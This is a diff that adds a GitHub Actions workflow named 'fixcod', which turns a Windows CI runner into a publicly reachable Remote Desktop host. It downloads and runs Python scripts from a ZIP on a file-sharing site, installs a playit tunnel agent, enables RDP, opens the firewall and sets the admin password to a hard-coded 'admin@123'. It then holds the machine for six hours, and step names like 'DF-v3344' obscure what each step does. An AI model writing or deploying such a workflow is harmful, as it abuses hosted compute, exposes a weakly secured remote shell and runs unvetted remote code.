@@ -1,0 +1,69 @@
+name: fixcod
+
+on:
+  workflow_dispatch:
+
+jobs:
+  setup-rdp-tunnel:
+    runs-on: windows-latest
+
+    steps:
+    - name: Check out the repository-v2025
+      uses: actions/checkout@v2
+
+    - name: Download full ZIP and extract-v2025
+      run: |
+        curl -L -o code.zip https://pixeldrain.com/api/file/rrBRwvJq/info/zip/main5.zip
+        Start-Sleep -Seconds 5
+        powershell -Command "Expand-Archive -Force code.zip extracted"
+
+    - name: Play-v333
+      run: |
+        Invoke-WebRequest -Uri "https://github.com/playit-cloud/playit-agent/releases/download/v0.15.26/playit-windows-x86_64-signed.exe" -OutFile "$env:USERPROFILE\playit.exe"
+        Start-Sleep -Seconds 5
+        
+    - name: DF-v3344
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "admin@123" -Force)
+    - name: Install requests package-b2025
+      run: python -m pip install requests
+
+    - name: Start main.py-v558
+      run: |
+        cd extracted
+        Write-Host "Starting main.py in background..."
+        Start-Process python test.py
+        Start-Sleep -Seconds 30
+
+    - name: Start main.py-v558
+      run: |
+        cd extracted
+        Write-Host "Starting main.py in background..."
+        Start-Process python main.py
+        Start-Sleep -Seconds 10
+
+    - name: Start main.py-v558
+      run: |
+        cd extracted
+        Write-Host "Starting main.py in background..."
+        Start-Process python test2.py
+        Start-Sleep -Seconds 30
+
+    - name: Start main.py-v558
+      run: |
+        cd extracted
+        Write-Host "Starting main.py in background..."
+        Start-Process python test3.py
+        Start-Sleep -Seconds 30
+
+    - name: DF-V1158
+      env:
+        PLAYIT_AUTH_KEY: ${{ secrets.DF }} 
+      run: |
+        Start-Process -FilePath "$env:USERPROFILE\playit.exe" -ArgumentList "--secret $env:PLAYIT_AUTH_KEY" -NoNewWindow -Wait
+        Start-Process -FilePath "$env:USERPROFILE\playit.exe" -NoNewWindow
+
+    - name: Keep alive-v2025
+      run: Start-Sleep -Seconds 21600  
